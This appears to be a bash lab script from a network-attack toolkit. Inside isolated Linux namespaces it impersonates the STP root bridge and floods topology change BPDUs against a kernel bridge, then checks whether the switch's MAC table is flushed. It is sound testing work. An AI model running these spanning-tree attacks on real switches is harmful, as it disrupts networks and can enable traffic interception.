#!/usr/bin/env bash
# Isolated topology change flooding lab (Linux only, needs root).
#
# Topology, all inside network namespaces:
#
#   root --(veth)-- [switch: br0 with STP, port sw-r]
#                   [switch port sw-a] --(veth)-- attacker
#                   [switch port sw-m] --(veth)-- monitor
#
#   root:     the real root bridge (priority 8192).
#   switch:   a bridge running 802.1D Spanning Tree (kernel STP).
#   attacker: sends the real root's ID from its own bridge (priority 0, cost 0), so it wins
#             the root port. Two runs of equal length:
#               control: impersonation without the topology change flag,
#               flood:   the same stream with the topology change flag set in every BPDU.
#   monitor:  a host whose MAC the switch learns on port sw-m. The switch should forget it
#             when the topology change flag flushes its table.
#
# Evidence per phase: the switch's root port, whether the monitor's MAC is still in the
# switch's table, and the switch's topology_change_detected flag.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/topology_change_flooding_lab.sh
#   sudo CLAIMS=30 scripts/lab/topology_change_flooding_lab.sh
#
# Requirements: iproute2 (ip, bridge), and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
CLAIMS="${CLAIMS:-16}"          # BPDUs per run; 16 x 0.5 s = 8 s
INTERVAL=0.5
SETTLE_SECONDS=12
RECOVER_SECONDS=30
ATTACKER_MAC="02:00:00:00:00:30"
MONITOR_MAC="02:00:00:00:00:40"

stop_lab() {
    for ns in monitor attacker root switch; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

stop_lab

ip netns add switch
ip netns add root
ip netns add attacker
ip netns add monitor

ip link add r-sw type veth peer name sw-r
ip link set r-sw netns root
ip link set sw-r netns switch

ip link add a-sw type veth peer name sw-a
ip link set a-sw netns attacker
ip link set sw-a netns switch

ip link add m-sw type veth peer name sw-m
ip link set m-sw netns monitor
ip link set sw-m netns switch

# Switch: 802.1D STP enabled, with short timers. sw-a is port 1, sw-r port 2 and sw-m port 3.
ip netns exec switch ip link add br0 type bridge stp_state 1 \
    forward_delay 200 hello_time 200 max_age 600
ip netns exec switch ip link set br0 up
for port in sw-a sw-r sw-m; do
    ip netns exec switch ip link set "$port" master br0
    ip netns exec switch ip link set "$port" up
done

ip netns exec root ip link add rb0 type bridge stp_state 1 priority 8192 \
    forward_delay 200 hello_time 200 max_age 600
ip netns exec root ip link set rb0 up
ip netns exec root ip link set r-sw master rb0
ip netns exec root ip link set r-sw up

ip netns exec attacker ip link set a-sw address "$ATTACKER_MAC"
ip netns exec attacker ip link set a-sw up
ip netns exec monitor ip link set m-sw address "$MONITOR_MAC"
ip netns exec monitor ip link set m-sw up

ROOT_MAC="$(ip netns exec root ip -o link show rb0 | grep -o 'link/ether [0-9a-f:]*' | awk '{print $2}')"

# Name of the switch port that is the root port of br0 ("sw-a", "sw-r", "sw-m", or "none").
root_port_name() {
    local number port port_no
    number="$(ip netns exec switch ip -d link show br0 | grep -o 'root_port [0-9]*' | awk '{print $2}')"
    if [[ "$number" == "0" || -z "$number" ]]; then
        echo "none"
        return
    fi
    for port in sw-a sw-r sw-m; do
        port_no="$(ip netns exec switch ip -d link show "$port" | grep -o 'port_no 0x[0-9a-f]*' | awk '{print $2}')"
        if (( port_no == number )); then
            echo "$port"
            return
        fi
    done
    echo "port $number"
}

# "learned" if the switch's table still has the monitor's MAC, "flushed" if not.
monitor_entry() {
    if ip netns exec switch bridge fdb show br br0 | grep -qi "$MONITOR_MAC"; then
        echo "learned"
    else
        echo "flushed"
    fi
}

tc_detected() {
    ip netns exec switch ip -d link show br0 | grep -o 'topology_change_detected [0-9]*' | awk '{print $2}'
}

# The monitor sends one frame so the switch learns its MAC on sw-m.
LEARN_CODE='
from scapy.all import Ether, Raw, sendp
sendp(Ether(src="'"$MONITOR_MAC"'", dst="ff:ff:ff:ff:ff:ff", type=0x88B5) / Raw(b"\x00" * 46), iface="m-sw", verbose=False)
'

learn_monitor() {
    ip netns exec monitor env PYTHONPATH="$ROOT/src" "$PY" -c "$LEARN_CODE"
    sleep 1
}

IMPERSONATE_CODE='
import os
from macabre.attacks.root_bridge_impersonation import RootBridgeImpersonationConfig, run_root_bridge_impersonation
import threading
stats = run_root_bridge_impersonation(
    RootBridgeImpersonationConfig(iface="a-sw", root_priority=8192, root_mac=os.environ["ROOT_MAC"],
                                  root_path_cost=0, bridge_priority=0,
                                  count=int(os.environ["CLAIMS"]), interval=float(os.environ["INTERVAL"])),
    threading.Event(), lambda _: None,
)
print(f"Attacker (control, no TC flag): sent {stats.frames} BPDUs as root {stats.root_id}")
'

FLOOD_CODE='
import os
from macabre.attacks.topology_change_flooding import TopologyChangeFloodingConfig, run_topology_change_flooding
import threading
stats = run_topology_change_flooding(
    TopologyChangeFloodingConfig(iface="a-sw", root_priority=8192, root_mac=os.environ["ROOT_MAC"],
                                 root_path_cost=0, bridge_priority=0,
                                 count=int(os.environ["CLAIMS"]), interval=float(os.environ["INTERVAL"])),
    threading.Event(), lambda _: None,
)
print(f"Attacker (flood, TC flag set): sent {stats.frames} BPDUs as root {stats.root_id}")
'

# Runs the attacker in the background and samples the switch at the given seconds.
# Arguments: label, python code, samples as "t:name" pairs, e.g. "2:control".
run_attack_phase() {
    local label="$1" code="$2"
    shift 2
    echo "$label"
    ip netns exec attacker env PYTHONPATH="$ROOT/src" ROOT_MAC="$ROOT_MAC" \
        CLAIMS="$CLAIMS" INTERVAL="$INTERVAL" "$PY" -c "$code" &
    local pid=$!
    local last=0 sample at
    for sample in "$@"; do
        at="${sample%%:*}"
        sleep $(( at - last ))
        last=$at
        echo "  t+${at}s root port: $(root_port_name)  monitor MAC: $(monitor_entry)  TC detected flag: $(tc_detected)"
    done
    wait "$pid"
}

# --- Phase 1: baseline -----------------------------------------------------

echo "Waiting ${SETTLE_SECONDS}s for the real root to be elected"
sleep "$SETTLE_SECONDS"
learn_monitor

echo "Phase 1: baseline (no attacker)"
BASE_PORT="$(root_port_name)"
BASE_MAC="$(monitor_entry)"
BASE_TC="$(tc_detected)"
echo "  root port: $BASE_PORT   monitor MAC: $BASE_MAC   TC detected flag: $BASE_TC"
echo

# --- Phase 2: control, impersonation without the flag ---------------------

run_attack_phase "Phase 2: control, $CLAIMS BPDUs as the root without the TC flag" "$IMPERSONATE_CODE" "2:c" "8:c"
CONTROL_PORT="$(root_port_name)"
CONTROL_MAC="$(monitor_entry)"
CONTROL_TC="$(tc_detected)"
echo "  end: root port $CONTROL_PORT   monitor MAC $CONTROL_MAC   TC detected flag $CONTROL_TC"
echo
echo "Phase 2b: control recovery, waiting ${RECOVER_SECONDS}s"
sleep "$RECOVER_SECONDS"
learn_monitor

# --- Phase 3: topology change flood ---------------------------------------

run_attack_phase "Phase 3: flood, $CLAIMS BPDUs as the root with the TC flag set" "$FLOOD_CODE" "2:f" "8:f"
FLOOD_PORT="$(root_port_name)"
FLOOD_MAC="$(monitor_entry)"
FLOOD_TC="$(tc_detected)"
echo "  end: root port $FLOOD_PORT   monitor MAC $FLOOD_MAC   TC detected flag $FLOOD_TC"
echo
echo "Phase 3b: flood recovery, waiting ${RECOVER_SECONDS}s"
sleep "$RECOVER_SECONDS"

# --- Verdict ---------------------------------------------------------------

if [[ "$BASE_PORT" == "sw-r" && "$BASE_MAC" == "learned" ]]; then
    echo "Baseline: root port on the real root (sw-r) and the monitor's MAC is learned. OK"
else
    echo "Baseline: root port $BASE_PORT, monitor MAC $BASE_MAC. Result unreliable."
fi
if [[ "$CONTROL_MAC" == "learned" ]]; then
    echo "Control: impersonation without the TC flag kept the monitor's MAC. The root change alone does not flush it."
else
    echo "Control: impersonation without the TC flag flushed the monitor's MAC. The root change alone causes a flush."
fi
if [[ "$FLOOD_MAC" == "flushed" ]]; then
    echo "Flood: the TC flag flushed the monitor's MAC from the switch's table. Vulnerable."
else
    echo "Flood: the monitor's MAC stayed learned, and the switch did not flag a topology change from the TC bit (topology_change_detected $FLOOD_TC). This switch does not act on the TC flag from its root port in this lab, so the effect is not reproduced. Test on a real switch."
fi
